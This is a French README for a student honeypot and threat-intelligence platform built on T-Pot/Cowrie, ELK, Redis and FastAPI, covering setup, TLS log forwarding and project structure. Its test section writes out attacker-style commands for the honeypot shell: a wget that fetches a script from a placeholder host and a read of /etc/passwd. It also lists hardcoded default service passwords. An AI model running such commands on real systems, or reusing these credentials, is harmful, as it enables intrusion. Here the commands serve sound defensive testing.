# DECEPTR v1 — Plateforme de Cyberdeception

Projet de Fin d'Annee — 1re Annee Cycle Ingenieur
ISMAGI Rabat | Chambre des Representants du Maroc

## Stack technique

- **Cyberdeception** : T-Pot (Cowrie SSH/Telnet)
- **Collecte** : Filebeat + Logstash
- **Queue** : Redis (tampon anti-perte Logstash -> Pipeline)
- **Stockage** : Elasticsearch + MySQL 8 + MinIO
- **Pipeline** : Python 3 (7 etapes)
- **Threat Intel** : VirusTotal, AbuseIPDB, GeoLite2, Feodo Tracker, MITRE ATT&CK
- **Visualisation** : Kibana
- **Alerting** : ElastAlert 2 (email)
- **API** : FastAPI
- **Conteneurisation** : Docker Compose

## Demarrage rapide

### Linux / Mac
```bash
./start.sh
```

### Windows
```
start.bat
```

Premier lancement : 2-3 minutes (build des images). Le demarrage rapide lance
le mode architecture cible : T-Pot Cowrie officiel + DECEPTR, sans Cowrie local.

### Mode production avec T-Pot officiel

Installer T-Pot sur une VM/serveur Linux dedie en DMZ, puis utiliser le
forwarder dans `tpot/` pour envoyer Cowrie vers DECEPTR en TLS.

Documents :
- `docs/tpot-integration.md`
- `docs/logical-completion-status.md`

Demarrer l'architecture cible complete :
```powershell
powershell -ExecutionPolicy Bypass -File .\scripts\start-architecture.ps1
```

Arreter l'architecture sans supprimer les donnees :
```powershell
powershell -ExecutionPolicy Bypass -File .\scripts\stop-architecture.ps1
```

Demarrer seulement DECEPTR sans Cowrie local quand le vrai T-Pot est deja pret :
```bash
docker compose -f docker-compose.yml -f docker-compose.tpot.yml up -d --build
```

Pour garder Cowrie local en lab isole :
```bash
docker compose -f docker-compose.yml -f docker-compose.tpot.yml --profile local-cowrie up -d
```

## Acces

| Service | URL | Identifiants |
|---|---|---|
| Dashboard | http://127.0.0.1:8088/index.html?v=3 | admin / deceptr2025 |
| API Docs | http://localhost:8000/docs | — |
| Kibana | http://localhost:5601 | elastic / deceptr2025 |
| MinIO | http://localhost:9001 | deceptr_admin / MotDePasseMinIO2026! |
| T-Pot Cowrie SSH | `ssh root@127.0.0.1 -p 22` | honeypot |
| T-Pot Cowrie Telnet | `telnet 127.0.0.1 23` | honeypot |

## Configuration

Editer `.env` pour :
- Cles API VirusTotal / AbuseIPDB (optionnel — fonctionne sans)
- SMTP pour les alertes email
- Mots de passe MySQL / Elasticsearch / Redis / MinIO
- Forwarder T-Pot vers DECEPTR avec TLS sur `5044`

### TLS Filebeat -> Logstash et integration T-Pot

Le flux Beats vers Logstash utilise TLS sur le port `5044`.
Les certificats locaux sont dans `elk/certs/` :
- `ca.crt` : certificat CA a copier vers un Filebeat T-Pot externe
- `logstash.crt` / `logstash.key` : certificat serveur Logstash

En mode architecture, DECEPTR ne lit pas directement les fichiers de T-Pot.
Le conteneur `deceptr-tpot-forwarder` cote T-Pot lit `cowrie.json` et envoie
les evenements vers DECEPTR Logstash en TLS.

Selon l'installation T-Pot, le fichier Cowrie se trouve souvent dans :
```text
/data/cowrie/log/cowrie.json
/home/tpotuser/tpotce/data/cowrie/log/cowrie.json
```

Pour envoyer depuis un Filebeat installe sur le serveur T-Pot vers DECEPTR,
copier `elk/certs/ca.crt` sur le serveur T-Pot puis utiliser :
```yaml
output.logstash:
  hosts: ["DECEPTR_IP:5044"]
  ssl.enabled: true
  ssl.certificate_authorities: ["/etc/filebeat/certs/deceptr-ca.crt"]
```

Autoriser le port `5044` seulement depuis l'adresse IP du serveur T-Pot
ou via VPN/pare-feu.

### GeoLite2 (optionnel)

1. Creer un compte gratuit sur https://www.maxmind.com/en/geolite2/signup
2. Telecharger `GeoLite2-City.mmdb`
3. Placer dans `pipeline/data/GeoLite2-City.mmdb`

## Structure du projet

```
deceptr/
├── docker-compose.yml
├── .env
├── start.sh / start.bat
│
├── cowrie/                  # Config honeypot
├── elk/                      # Filebeat, Logstash, ElastAlert
├── config/redis/             # Redis AOF + queue config
├── mysql/                     # Schema + procedures stockees
│
├── pipeline/
│   ├── main.py               # Orchestrateur (7 etapes)
│   ├── collector.py           # 1. Collecte (Redis, fallback ES cowrie-*)
│   ├── normalizer.py          # 2. Normalisation
│   ├── enricher.py            # 3. Enrichissement (TI)
│   ├── correlator.py          # 4. MITRE ATT&CK
│   ├── risk_scorer.py         # 5. Risk Scoring
│   ├── detector.py            # 6. Detection (6 regles)
│   ├── alerter.py             # 7a. Alertes email
│   ├── storage.py             # 7b. Stockage ES + MySQL + buckets MinIO
│   └── api/                   # FastAPI
│       ├── main.py
│       ├── auth.py
│       ├── database.py
│       └── routes/
│           ├── auth.py
│           ├── alerts.py
│           ├── iocs.py
│           ├── attackers.py
│           ├── campaigns.py
│           └── dgssi.py        # Rapport conformite DGSSI
│
├── dashboard/
│   └── index.html             # Interface web
│
└── docs/
    └── architecture.md
```

## Tests

Generer du trafic vers le honeypot :
```bash
# Tentative SSH vers T-Pot Cowrie
ssh admin@127.0.0.1 -p 22
# n'importe quel mot de passe sera capture par le honeypot

# Puis dans le shell honeypot :
wget http://example.com/test.sh
cat /etc/passwd
```

Verifier dans le dashboard que l'evenement apparait avec :
- Score de risque calcule
- Technique MITRE ATT&CK identifiee
- Pays d'origine (si GeoLite2 configure)

## Conformite DGSSI

Le rapport `/api/dgssi/rapport` genere un document HTML conforme a la
Directive DGSSI n°001, pret a etre exporte en PDF (Ctrl+P → Enregistrer en PDF).

## Perspectives futures

Voir `docs/architecture.md` — section "Perspectives post-MVP"
